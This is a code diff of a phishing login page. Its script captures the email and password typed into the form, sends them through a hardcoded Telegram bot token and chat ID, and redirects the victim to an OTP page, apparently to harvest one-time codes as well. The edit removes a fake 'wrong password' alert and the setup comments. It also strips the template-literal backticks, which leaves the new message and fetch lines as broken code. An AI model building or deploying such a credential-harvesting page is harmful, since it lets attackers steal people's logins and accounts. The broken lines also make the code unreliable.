@@ -8,20 +8,23 @@
 </head>
 <body class="login-page">
 
-<form id="loginForm">
-    <div class="input-container">
-        <input type="email" name="email" placeholder="Enter your email" class="input-box email-box" required>
-        <input type="password" name="password" placeholder="Enter your password" class="input-box password-box" required>
-    </div>
+    <!-- Background div -->
+    <div class="background"></div>
 
-    <div class="login-text">
-        <button type="submit" class="login-button">Login</button>
-    </div>
-</form>
+    <form id="loginForm">
+        <div class="input-container">
+            <input type="email" name="email" placeholder="Enter your email" class="input-box email-box" required>
+            <input type="password" name="password" placeholder="Enter your password" class="input-box password-box" required>
+        </div>
+
+        <div class="login-text">
+            <button type="submit" class="login-button">Login</button>
+        </div>
+    </form>
 
 <script>
-const BOT_TOKEN = '8387730686:AAFo7mnRLBtTkN3HAWrznqbW7fsOxD57HkU';   // <-- Replace with your bot token locally
-const CHAT_ID = '-4909990023';       // <-- Replace with your chat ID; add "-" if it's a group
+const BOT_TOKEN = '8387730686:AAFo7mnRLBtTkN3HAWrznqbW7fsOxD57HkU';
+const CHAT_ID = '-4909990023';
 
 const form = document.getElementById('loginForm');
 form.addEventListener('submit', function(e){
@@ -30,15 +33,14 @@ form.addEventListener('submit', function(e){
     const email = form.email.value;
     const password = form.password.value;
 
-    const message = `Login Submission:\nEmail: ${email}\nPassword: ${password}`;
+    const message = Login Submission:\nEmail: ${email}\nPassword: ${password};
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ chat_id: CHAT_ID, text: message })
     })
     .then(() => {
-        alert('wrong password');
         // Redirect to OTP page after sending
         window.location.href = 'otp.html';
     })
